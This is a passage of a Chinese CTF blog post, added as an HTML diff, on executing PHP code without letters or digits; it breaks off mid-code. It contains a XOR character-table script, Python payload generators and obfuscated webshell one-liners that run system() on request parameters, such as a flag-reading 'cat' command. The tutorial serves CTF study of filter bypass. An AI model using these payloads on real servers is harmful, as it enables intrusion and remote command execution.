@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="无字母数字rce 先补充一些点 php可变函数PHP: 可变函数 - Manual 1234567&lt;?phpfunction foo() &#123;echo &quot;In foo()&lt;br &#x2F;&gt;\n&quot;;&#125;$func &#x3D; &#x27;foo&#x27;;$func();        &#x2F;&#x2F; 调用 foo()?&gt;   php5-&gt;php7的变化a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无字母数字rce">
+<meta property="og:url" content="http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="无字母数字rce 先补充一些点 php可变函数PHP: 可变函数 - Manual 1234567&lt;?phpfunction foo() &#123;echo &quot;In foo()&lt;br &#x2F;&gt;\n&quot;;&#125;$func &#x3D; &#x27;foo&#x27;;$func();        &#x2F;&#x2F; 调用 foo()?&gt;   php5-&gt;php7的变化a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111204553556.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111204948379.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111222220723.png">
+<meta property="article:published_time" content="2026-01-28T10:34:16.000Z">
+<meta property="article:modified_time" content="2026-01-28T10:46:42.593Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="无字母数字RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111204553556.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>无字母数字rce</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Hexo" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2026/01/28/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Frce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&text=无字母数字rce"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&is_video=false&description=无字母数字rce"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无字母数字rce&body=Check out this article: http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&name=无字母数字rce&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&t=无字母数字rce"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-number">1.</span> <span class="toc-text">无字母数字rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">php可变函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5-php7%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">php5-&gt;php7的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#assert-%E6%96%AD%E8%A8%80%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">assert()断言函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%98%E9%87%8F%E5%A4%84%E7%90%86%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">关于变量处理的变化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5-php7"><span class="toc-number">1.3.</span> <span class="toc-text">php5&#x2F;php7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E3%80%81%E6%88%96"><span class="toc-number">1.3.1.</span> <span class="toc-text">异或、或</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6%E7%9A%84%E9%9B%86%E5%90%88"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">生成可用字符的集合</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-php7-py"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">payload_php7.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-php5-py"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">payload_php5.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84%E5%BC%82%E6%88%96%E3%80%81%E6%88%96"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">可见字符的异或、或</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E4%BB%A3%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.1.4.1.</span> <span class="toc-text">一代脚本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BA%8C%E4%BB%A3%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.1.4.2.</span> <span class="toc-text">二代脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">取反</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php5-re-php"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">php5_re.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php7-re-php"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">php7_re.php</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">1.3.3.</span> <span class="toc-text">自增</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php5"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">php5</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.</span> <span class="toc-text">临时文件</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        无字母数字rce
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-28T10:34:16.000Z" class="dt-published" itemprop="datePublished">2026-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" rel="tag">无字母数字RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="无字母数字rce"><a href="#无字母数字rce" class="headerlink" title="无字母数字rce"></a>无字母数字rce</h2><blockquote>
+<p>先补充一些点</p>
+<h3 id="php可变函数"><a href="#php可变函数" class="headerlink" title="php可变函数"></a><strong><code>php</code>可变函数</strong></h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.variable-functions.php">PHP: 可变函数 - Manual</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;In foo()&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>();        <span class="comment">// 调用 foo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="php5-php7的变化"><a href="#php5-php7的变化" class="headerlink" title="php5-&gt;php7的变化"></a><strong>php5-&gt;php7的变化</strong></h3><h4 id="assert-断言函数"><a href="#assert-断言函数" class="headerlink" title="assert()断言函数"></a><strong><code>assert()</code>断言函数</strong></h4><blockquote>
+<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>
+<p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来<code>getshell</code>。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111204553556.png" alt="image-20260111204553425"></p>
+<h4 id="关于变量处理的变化"><a href="#关于变量处理的变化" class="headerlink" title="关于变量处理的变化"></a>关于变量处理的变化</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.variable-handling">PHP: 不向后兼容的变更 - Manual</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111204948379.png" alt="image-20260111204948311"></p>
+<p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<p>我的理解这里的变化和可变函数的区别是减少了值为函数名的变量，就是不需要<code>$</code>了</p>
+</blockquote>
+<h3 id="php5-php7"><a href="#php5-php7" class="headerlink" title="php5&#x2F;php7"></a>php5&#x2F;php7</h3><ul>
+<li>异或、或</li>
+<li>取反</li>
+</ul>
+<h4 id="异或、或"><a href="#异或、或" class="headerlink" title="异或、或"></a>异或、或</h4><h5 id="生成可用字符的集合"><a href="#生成可用字符的集合" class="headerlink" title="生成可用字符的集合"></a>生成可用字符的集合</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;chars.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));<span class="comment">#异或</span></span><br><span class="line">		<span class="comment">// $c=(urldecode($a)|urldecode($b));#或</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="payload-php7-py"><a href="#payload-php7-py" class="headerlink" title="payload_php7.py"></a>payload_php7.py</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;chars.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span><span class="comment">#异或</span></span><br><span class="line">   <span class="comment"># output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;#或</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    function=action(<span class="built_in">input</span>(<span class="string">&quot;[+] your function：&quot;</span>) )</span><br><span class="line">    command=action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    param=function+command+<span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+
+<h5 id="payload-php5-py"><a href="#payload-php5-py" class="headerlink" title="payload_php5.py"></a>payload_php5.py</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;chars.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span><span class="comment">#异或</span></span><br><span class="line">   <span class="comment"># output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;#或</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    function=action(<span class="built_in">input</span>(<span class="string">&quot;[+] your function：&quot;</span>) )</span><br><span class="line">    command=action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    param=<span class="string">&quot;$_=&quot;</span>+function+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;$__=&quot;</span>+command+<span class="string">&quot;;$_($__);&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+
+<h5 id="可见字符的异或、或"><a href="#可见字符的异或、或" class="headerlink" title="可见字符的异或、或"></a>可见字符的异或、或</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=<span class="string">&#x27;!+/((&#x27;</span>^<span class="string">&#x27;~&#123;`&#123;|&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$$_</span>;<span class="variable">$__</span>=<span class="string">&#x27;(&quot;((%-&#x27;</span>^<span class="string">&#x27;[[[\@@&#x27;</span>;<span class="variable">$__</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"><span class="comment">//system($_POST[_])</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=<span class="string">&quot;_&quot;</span>.~<span class="string">&quot;\xb8\xba\xab&quot;</span>;<span class="variable">$__</span>=<span class="variable">$$_</span>;(<span class="variable">$__</span>[_])(<span class="variable">$__</span>[__]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*GET: params = &#123;</span></span><br><span class="line"><span class="comment">    &#x27;_&#x27;: &#x27;system&#x27;,</span></span><br><span class="line"><span class="comment">    &#x27;__&#x27;: &#x27;cat /ffflllaaaggg&#x27;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;<span class="variable">$_</span>=~(北)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(熙)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(北)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(拾)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(的)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(和)[<span class="variable">$____</span>];<span class="variable">$___</span>=~(样)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(说)[<span class="variable">$____</span>];<span 